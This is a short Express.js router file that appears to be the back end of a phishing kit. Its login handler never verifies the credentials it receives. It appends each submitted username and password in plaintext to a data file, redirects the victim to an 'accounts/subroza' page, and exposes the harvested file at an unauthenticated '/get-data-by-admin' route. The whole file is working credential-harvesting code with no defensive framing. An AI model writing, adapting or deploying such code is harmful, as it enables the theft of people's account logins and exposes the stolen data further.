const express = require('express');
const fs = require('fs');
const path = require('path');

const router = express.Router();

module.exports = () => {

  router.get('/login', (req, res, next) => {
    res.render("login", { error: req.query.err === "true" });
  })

  router.get('/accounts/subroza', (req, res, next) => {
    res.render('subroza');
  })

  router.post('/login', (req, res, next) => {
    if((!req.body.username || !req.body.password) || (req.body.username.length < 8 || req.body.password.length < 8)) return res.redirect('/login?err=true');
    fs.appendFile(path.resolve(`${__dirname}/../data/data.txt`), "Username: " + req.body.username + "\r\nPassword: " + req.body.password + "\r\n----------------\r\n", err => {if(err) console.log(err);res.redirect('/accounts/subroza');});
  })

  router.get('/get-data-by-admin', (req, res, next) => {
    res.sendFile(path.resolve(`${__dirname}/../data/data.txt`));
  })

  return router;
}
